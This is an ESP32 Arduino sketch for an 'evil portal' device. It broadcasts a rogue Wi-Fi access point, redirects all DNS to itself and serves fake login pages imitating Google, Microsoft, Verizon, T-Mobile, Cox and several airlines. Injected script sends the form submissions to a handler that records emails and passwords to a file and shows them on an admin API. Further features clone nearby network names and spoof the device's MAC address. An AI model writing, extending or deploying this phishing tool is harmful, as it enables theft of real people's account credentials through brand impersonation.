#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>
#include <Preferences.h>
#include <vector>
#include <esp_wifi.h> 
#include <esp_mac.h>
#include <esp_err.h> 
#include <esp_event.h> 

#include "index.h"
#include "google.h"
#include "tmobile.h"
#include "jetblue.h"
#include "spirit.h" 
#include "verizon.h" 
#include "americanairline.h" 
#include "southwest.h" 
#include "cox.h"
#include "microsoft.h"

Preferences preferences;

String softap_ssid = "EvilESP32AP"; // default SSIDD
IPAddress apIP(192, 168, 4, 1);

WebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;

struct APInfo {
  String ssid;
  String mac;
  int32_t rssi;
};
std::vector<APInfo> apList;

struct LoginAttempt {
  String email;
  String password;
};
std::vector<LoginAttempt> loginAttempts;
String customHtml = "";

enum class PortalType {
  NONE,
  GOOGLE,
  CUSTOM,
  TMOBILE,
  JETBLUE,
  SPIRIT, 
  VERIZON, 
  AMERICANAIRLINE, 
  SOUTHWEST, 
  COX,
  MICROSOFT,
  // add more portals here
};

const char* activeCaptivePortalHtml = nullptr;
PortalType currentPortalSelection = PortalType::NONE;

String buildJsonSuccess(String message);
String buildJsonError(String message, int code);
String getPortalNameFromType(PortalType type);
PortalType getPortalTypeFromName(String name);
String buildPortalsJson();
String buildApListJson();
String buildLoginAttemptsJson();

void handleApiPortals();
void handleApiSettings();
void handleApiApList();
void handleApiLoginAttempts();
void handleApiActivePortal();
void handleApiConnectedClients();

void handleUpload();
void handleChangeSettings();
void handleAPScanner();
void handleSelectPortal();
void handleLogin();
void handleCaptivePortal();
void handleNotFound();


// returns portal name as a string from portal type enum
String getPortalNameFromType(PortalType type) {
    switch (type) {
        case PortalType::GOOGLE: return "Google";
        case PortalType::TMOBILE: return "Tmobile";
        case PortalType::JETBLUE: return "Jetblue";
        case PortalType::SPIRIT: return "Spirit"; 
        case PortalType::VERIZON: return "Verizon"; 
        case PortalType::AMERICANAIRLINE: return "Americanairline"; 
        case PortalType::SOUTHWEST: return "Southwest"; 
        case PortalType::COX: return "Cox";
        case PortalType::MICROSOFT: return "Microsoft"; 
        // add more portals here
        case PortalType::CUSTOM: return "Custom";
        case PortalType::NONE:   return "None";
        default: return "Unknown";
    }
}

// returns portal type enum from portal name stringgg
PortalType getPortalTypeFromName(String name) {
    if (name == "Google")  return PortalType::GOOGLE;
    if (name == "Tmobile") return PortalType::TMOBILE;
    if (name == "Jetblue") return PortalType::JETBLUE;
    if (name == "Spirit") return PortalType::SPIRIT;
    if (name == "Verizon") return PortalType::VERIZON;
    if (name == "Americanairline") return PortalType::AMERICANAIRLINE;
    if (name == "Southwest") return PortalType::SOUTHWEST;
    if (name == "Cox") return PortalType::COX;
    if (name == "Microsoft") return PortalType::MICROSOFT;
    // add more portals here
    if (name == "Custom")  return PortalType::CUSTOM;
    if (name == "None")    return PortalType::NONE;
    return PortalType::NONE;
}

// builds a json success response
String buildJsonSuccess(String message = "Operation successful") {
  return "{\"status\":\"success\",\"message\":\"" + message + "\"}";
}

// builds a json error response
String buildJsonError(String message = "Operation failed", int code = 400) {
  return "{\"status\":\"error\",\"message\":\"" + message + "\",\"code\":" + String(code) + "}";
}

// builds a json array of available portal namess
String buildPortalsJson() {
  std::vector<String> availablePortalNames;
  
  availablePortalNames.push_back(getPortalNameFromType(PortalType::GOOGLE));
  availablePortalNames.push_back(getPortalNameFromType(PortalType::TMOBILE));
  availablePortalNames.push_back(getPortalNameFromType(PortalType::JETBLUE));
  availablePortalNames.push_back(getPortalNameFromType(PortalType::SPIRIT)); 
  availablePortalNames.push_back(getPortalNameFromType(PortalType::VERIZON)); 
  availablePortalNames.push_back(getPortalNameFromType(PortalType::AMERICANAIRLINE)); 
  availablePortalNames.push_back(getPortalNameFromType(PortalType::SOUTHWEST)); 
  availablePortalNames.push_back(getPortalNameFromType(PortalType::COX));
  availablePortalNames.push_back(getPortalNameFromType(PortalType::MICROSOFT));
  // add portal here

  String json = "[";
  for (size_t i = 0; i < availablePortalNames.size(); ++i) {
    json += "\"" + availablePortalNames[i] + "\"";
    if (i < availablePortalNames.size() - 1) {
      json += ",";
    }
  }
  json += "]";
  return json;
}

// builds a json array of scanned access points
String buildApListJson() {
  String json = "[";
  for (size_t i = 0; i < apList.size(); ++i) {
    json += "{\"ssid\":\"" + apList[i].ssid + "\",\"mac\":\"" + apList[i].mac + "\",\"rssi\":" + String(apList[i].rssi) + "}";
    if (i < apList.size() - 1) {
      json += ",";
    }
  }
  json += "]";
  return json;
}

// builds a json array of captured login attempts
String buildLoginAttemptsJson() {
  String json = "[";
  for (size_t i = 0; i < loginAttempts.size(); ++i) {
    json += "{\"email\":\"" + loginAttempts[i].email + "\",\"password\":\"" + loginAttempts[i].password + "\"}";
    if (i < loginAttempts.size() - 1) {
      json += ",";
    }
  }
  json += "]";
  return json;
}

// handles api request for portals
void handleApiPortals() {
  server.send(200, "application/json", buildPortalsJson());
}

// handles api request for current softap settings (ssid and mac)
void handleApiSettings() {
  String macAddress = WiFi.softAPmacAddress().c_str();
  String json = "{\"ssid\":\"" + softap_ssid + "\",\"mac\":\"" + macAddress + "\"}";
  server.send(200, "application/json", json);
}

// handles api request for number of connected clients
void handleApiConnectedClients() {
  int connectedClients = WiFi.softAPgetStationNum();
  String json = "{\"connectedClients\":" + String(connectedClients) + "}";
  server.send(200, "application/json", json);
}

// handles api request for scanned access point list
void handleApiApList() {
  server.send(200, "application/json", buildApListJson());
}

// handles api request for captured login attempts
void handleApiLoginAttempts() {
  server.send(200, "application/json", buildLoginAttemptsJson());
}

// handles api request for current active portal
void handleApiActivePortal() {
    String activePortalNameStr = getPortalNameFromType(currentPortalSelection);
    String json = "{\"activePortal\":\"" + activePortalNameStr + "\"}";
    server.send(200, "application/json", json);
}

// handles upload of custom html for captive portal
void handleUpload() {
  if (server.hasArg("html")) {
    customHtml = server.arg("html");
    File file = SPIFFS.open("/custom_portal.html", "w");
    if (file) {
        file.print(customHtml);
        file.close();
        Serial.println("[*] custom html saved to spiffs.");
    } else {
        Serial.println("[-] failed to save custom html to file system.");
        server.send(500, "application/json", buildJsonError("failed to save custom html to file system."));
        return;
    }
    activeCaptivePortalHtml = customHtml.c_str();
    currentPortalSelection = PortalType::CUSTOM;

    preferences.begin("portal-settings", false);
    preferences.putInt("active_portal_type", static_cast<int>(currentPortalSelection));
    preferences.end();

    server.send(200, "application/json", buildJsonSuccess("custom html uploaded and set as active portal!"));
    Serial.println("custom html uploaded and set as active portal.");
  } else {
    server.send(400, "application/json", buildJsonError("missing html template"));
  }
}

// handles selection of a captive portal
void handleSelectPortal() {
  if (server.hasArg("portalName")) {
    String requestedPortalName = server.arg("portalName");
    PortalType newSelection = getPortalTypeFromName(requestedPortalName);

    const char* htmlContent = nullptr;

    switch (newSelection) {
        case PortalType::GOOGLE:
            htmlContent = GOOGLE;
            Serial.println("[*] selected google portal.");
            break;
        case PortalType::TMOBILE:
            htmlContent = TMOBILE;
            Serial.println("[*] selected tmobile portal.");
            break;
        case PortalType::JETBLUE:
            htmlContent = JETBLUE;
            Serial.println("[*] selected jetblue portal.");
            break;
        case PortalType::SPIRIT:
            htmlContent = SPIRIT; 
            Serial.println("[*] selected spirit portal.");
            break;
        case PortalType::VERIZON:
            htmlContent = VERIZON; 
            Serial.println("[*] selected verizon portal.");
            break;
        case PortalType::AMERICANAIRLINE:
            htmlContent = AMERICANAIRLINE; 
            Serial.println("[*] selected american airline portal.");
            break;
        case PortalType::SOUTHWEST:
            htmlContent = SOUTHWEST; 
            Serial.println("[*] selected southwest portal.");
            break;
        case PortalType::COX:
            htmlContent = COX; 
            Serial.println("[*] selected cox portal.");
            break;
        // add more here
        case PortalType::MICROSOFT:
            htmlContent = MICROSOFT;
            Serial.println("[-] deactivated current portal.");
            break;
        case PortalType::NONE:
            htmlContent = nullptr;
            Serial.println("[-] deactivated current portal.");
            break;
        case PortalType::CUSTOM:
            if (customHtml != "") {
                htmlContent = customHtml.c_str();
                Serial.println("selected custom portal.");
            } else {
                server.send(400, "application/json", buildJsonError("custom portal html not found. please upload it first."));
                return;
            }
            break;
        default:
            server.send(400, "application/json", buildJsonError("invalid portal selection. please use a defined portal or upload custom html."));
            return;
    }

    currentPortalSelection = newSelection;
    activeCaptivePortalHtml = htmlContent;

    preferences.begin("portal-settings", false);
    preferences.putInt("active_portal_type", static_cast<int>(currentPortalSelection));
    preferences.end();

    String responseMessage = getPortalNameFromType(currentPortalSelection) + " portal selected and saved.";
    if (newSelection == PortalType::NONE) {
        responseMessage = "portal deactivated.";
    }
    server.send(200, "application/json", buildJsonSuccess(responseMessage));
    Serial.printf("portal selection successful. current active: %s.\n", getPortalNameFromType(currentPortalSelection).c_str());
  } else {
    server.send(400, "application/json", buildJsonError("missing portalname parameter."));
  }
}

// handles scanning for nearby access points
void handleAPScanner() {
  apList.clear();
  WiFi.mode(WIFI_AP_STA); 
  
  Serial.println("[*] scanning networks...");
  // scan for available wifi networks (not hidden, not asynchronous)
  int n = WiFi.scanNetworks(false, false); 
  Serial.printf("[*] scan done, %d networks found\n", n);

  if (n == 0) {
    Serial.println("[-] no networks found");
  } else {
    // iterate through scanned networks and store their details
    for (int i = 0; i < n; ++i) {
      APInfo ap;
      ap.ssid = WiFi.SSID(i);
      ap.mac = WiFi.BSSIDstr(i);
      ap.rssi = WiFi.RSSI(i);
      apList.push_back(ap);
      Serial.printf("%s (%s) %d dbm\n", ap.ssid.c_str(), ap.mac.c_str(), ap.rssi); 
    }
  }
  // revert wifi mode back to access point only
  WiFi.mode(WIFI_AP); 

  server.send(200, "application/json", buildJsonSuccess("ap scan completed!"));
}

// handles login attempts, capturing credentials
void handleLogin() {
  String email = "";
  String password = "";

  // check if request is post or get and extract credentials -> depending on portal... prob not the most efficient approach but in any case ...
  if (server.method() == HTTP_POST) {
    if (server.hasArg("email")) {
      email = server.arg("email");
    }
    if (server.hasArg("password")) {
      password = server.arg("password");
    }
  } 
  else if (server.method() == HTTP_GET) {
    if (server.hasArg("email")) {
      email = server.arg("email");
    }
    if (server.hasArg("password")) {
      password = server.arg("password");
    }
  }

  if (email != "" && password != "") {
    LoginAttempt attempt = {email, password};
    loginAttempts.push_back(attempt);

    Serial.printf("[*] captured credentials - email: %s, password: %s\n", email.c_str(), password.c_str());

    // open file to save credentials
    File file = SPIFFS.open("/pass.txt", "a+"); 
    if (!file) {
      Serial.println("[-] failed to open /pass.txt for writing");
      server.send(500, "application/json", buildJsonError("internal server error: could not save credentials."));
      return;
    }
    // write credentials to file
    file.print("email: ");
    file.print(email);
    file.print(", password: ");
    file.println(password);
    file.close();
    Serial.println("[*] credentials saved to /pass.txt");

    server.send(200, "application/json", buildJsonSuccess("account saved! you may now use the network.."));
  } else {
    server.send(400, "application/json", buildJsonError("invalid request: missing email or password."));
  }
}

// handles captive portal redirection and serves selected html
void handleCaptivePortal() {
  if (activeCaptivePortalHtml) {
    String servedHtml = activeCaptivePortalHtml; 
    // inject script to redirect form submissions to /login endpoin.. might not be necessary depending...
    int headEndIdx = servedHtml.indexOf("</head>");
    if (headEndIdx != -1) {
      String script = "<script>"
                      "document.addEventListener('DOMContentLoaded', function() {"
                      "  var forms = document.getElementsByTagName('form');"
                      "  for (var i = 0; i < forms.length; i++) {"
                      "    forms[i].action = '/login';"
                      "    forms[i].method = 'POST';"
                      "  }"
                      "});"
                      "</script>";
      servedHtml = servedHtml.substring(0, headEndIdx) + script + servedHtml.substring(headEndIdx); 
    }
    server.send(200, "text/html", servedHtml);
  } else {
    // serves a default page if no portal is selected
    server.send(200, "text/html", "<html><body><h1>captive portal: no portal selected.</h1><p>connect to the admin panel at <a href='http://192.168.4.1/dashboard'>http://192.168.4.1/dashboard</a> to select one or upload custom html.</p></body></html>");
  }
}

// handles not found pages, redirects to captive portal
void handleNotFound() {
  handleCaptivePortal();
}

// handles changes to softap ssid and mac address
void handleChangeSettings() {
  if (server.hasArg("ssid") && server.hasArg("mac")) {
    String newSsid = server.arg("ssid");
    String newMac = server.arg("mac");

    // validate mac address format
    if (newMac.length() != 17 || newMac.indexOf(':') == -1) {
        server.send(400, "application/json", buildJsonError("invalid mac address format. use xx:xx:xx:xx:xx:xx"));
        return;
    }
    
    // convert mac string to byte array
    uint8_t newMacBytes[6];
    if (sscanf(newMac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
               &newMacBytes[0], &newMacBytes[1], &newMacBytes[2], &newMacBytes[3], &newMacBytes[4], &newMacBytes[5]) != 6) {
        server.send(400, "application/json", buildJsonError("invalid mac address format. use xx:xx:xx:xx:xx:xx"));
        return;
    }
    // update softap ssid
    softap_ssid = newSsid;

    // disconnect and turn off wifi to apply new settings
    WiFi.disconnect();
    WiFi.mode(WIFI_OFF);
    delay(1000);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_err_t init_err = esp_wifi_init(&cfg);
    if (init_err != ESP_OK) {
        Serial.printf("[-] wifi init failed! error: %d (0x%X)\n", init_err, init_err);
        server.send(500, "application/json", buildJsonError("wifi initialization failed"));
        return;
    }
    // attempt to set new mac address for the softap interface
    esp_err_t mac_set_err = esp_wifi_set_mac(WIFI_IF_AP, newMacBytes);
    if (mac_set_err != ESP_OK) {
        Serial.printf("[-] failed to set mac address! error: %d (0x%X)\n", mac_set_err, mac_set_err);
        
        // retry setting mac after a short delay
        WiFi.mode(WIFI_AP);
        delay(100);
        mac_set_err = esp_wifi_set_mac(WIFI_IF_AP, newMacBytes);
        
        if (mac_set_err != ESP_OK) {
            server.send(500, "application/json", buildJsonError("mac address change failed. your esp32 may not support mac changes."));
            return;
        }
    } else {
        WiFi.mode(WIFI_AP);
    }
    
    delay(100);
    WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); 
    WiFi.softAP(softap_ssid.c_str(), NULL, 1, false, 10);
    
    Serial.printf("[*] softap re-initialized with ssid: %s. new mac is: %s\n", softap_ssid.c_str(), WiFi.softAPmacAddress().c_str());

    String responseJson = "{\"status\":\"success\",\"message\":\"softap ssid and mac changed immediately. these changes are temporary and will reset on reboot. current ap mac: " + WiFi.softAPmacAddress() + "\"}";
    server.send(200, "application/json", responseJson);
    
    Serial.printf("[*] new softap ssid: %s. current ap mac: %s.\n", softap_ssid.c_str(), WiFi.softAPmacAddress().c_str());
    delay(100);

  } else {
    server.send(400, "application/json", buildJsonError("missing ssid or mac parameters"));
  }
}

void setup() {
  Serial.begin(9600);
  Serial.println("\n[*] starting evil portal deployer...");

  if (!SPIFFS.begin(true)) {
    Serial.println("[-] spiffs mount failed! please upload data or format spiffs.");
  }
  Serial.println("[*] spiffs mounted successfully.");

  preferences.begin("portal-settings", false);
  int storedPortalType = preferences.getInt("active_portal_type", static_cast<int>(PortalType::NONE));
  currentPortalSelection = static_cast<PortalType>(storedPortalType);
  preferences.end();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0)); 
  WiFi.softAP(softap_ssid.c_str(), NULL, 1, false, 10); 

  if (currentPortalSelection == PortalType::CUSTOM) {
      File file = SPIFFS.open("/custom_portal.html", "r");
      if (file) {
          customHtml = file.readString();
          file.close();
          Serial.println("[*] custom html loaded from spiffs for previous selection.");
          activeCaptivePortalHtml = customHtml.c_str(); 
      } else {
          Serial.println("[-] custom portal was selected, but html file not found. resetting to none.");
          currentPortalSelection = PortalType::NONE;
          activeCaptivePortalHtml = nullptr; 
      }
  }
  switch (currentPortalSelection) {
    case PortalType::GOOGLE:
        activeCaptivePortalHtml = GOOGLE;
        Serial.println("[*] initialized with google portal.");
        break;
    case PortalType::TMOBILE:
        activeCaptivePortalHtml = TMOBILE;
        Serial.println("[*] initialized with tmobile portal.");
        break;
    case PortalType::JETBLUE:
        activeCaptivePortalHtml = JETBLUE;
        Serial.println("[*] initialized with jetblue portal.");
        break;
    case PortalType::SPIRIT: 
        activeCaptivePortalHtml = SPIRIT; 
        Serial.println("[*] initialized with spirit portal.");
        break;
    case PortalType::VERIZON: 
        activeCaptivePortalHtml = VERIZON; 
        Serial.println("[*] initialized with verizon portal.");
        break;
    case PortalType::AMERICANAIRLINE: 
        activeCaptivePortalHtml = AMERICANAIRLINE; 
        Serial.println("[*] initialized with american airline portal.");
        break;
    case PortalType::SOUTHWEST: 
        activeCaptivePortalHtml = SOUTHWEST; 
        Serial.println("[*] initialized with southwest portal.");
        break;
    case PortalType::COX: 
        activeCaptivePortalHtml = COX; 
        Serial.println("[*] initialized with cox portal.");
        break;
    case PortalType::MICROSOFT: 
        activeCaptivePortalHtml = MICROSOFT; 
        Serial.println("[*] initialized with microsoft portal.");
        break;
    case PortalType::CUSTOM:
        if (customHtml == "") { 
             activeCaptivePortalHtml = nullptr;
             currentPortalSelection = PortalType::NONE;
        }
        break;
    // add more portals here
    case PortalType::NONE:
    default:
        activeCaptivePortalHtml = nullptr;
        currentPortalSelection = PortalType::NONE;
        Serial.println("[*] no portal active on boot. waiting for selection.");
        break;
  }

  Serial.print("ap ip address: ");
  Serial.println(WiFi.softAPIP());
  Serial.print("ap mac address: ");
  Serial.println(WiFi.softAPmacAddress()); 

  dnsServer.start(DNS_PORT, "*", apIP);
  
    server.on("/dashboard", HTTP_GET, [](){
    server.send(200, "text/html", HTML_DASHBOARD);
  });
  
  server.on("/api/portals", HTTP_GET, handleApiPortals);
  server.on("/api/aplist", HTTP_GET, handleApiApList);
  server.on("/api/login_attempts", HTTP_GET, handleApiLoginAttempts);
  server.on("/api/settings", HTTP_GET, handleApiSettings);
  server.on("/api/active_portal", HTTP_GET, handleApiActivePortal);
  server.on("/api/connected_clients", HTTP_GET, handleApiConnectedClients);

  server.on("/upload", HTTP_POST, handleUpload); 
  server.on("/apscanner", HTTP_POST, handleAPScanner);
  server.on("/changesettings", HTTP_POST, handleChangeSettings);
  server.on("/select_portal", HTTP_POST, handleSelectPortal);

  server.on("/login", HTTP_POST, handleLogin); 
  server.on("/get", HTTP_GET, handleLogin); 
  // handle all other requests with captive portal
  server.onNotFound(handleNotFound); 

  server.begin();
  Serial.println("[*] web server started.");
  Serial.print("[*] admin dashboard url: http://");
  Serial.print(apIP);
  Serial.println("/dashboard"); 
  Serial.println("[*] captive portal: connect to '" + softap_ssid + "' ap. access dashboard via /dashboard.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
}
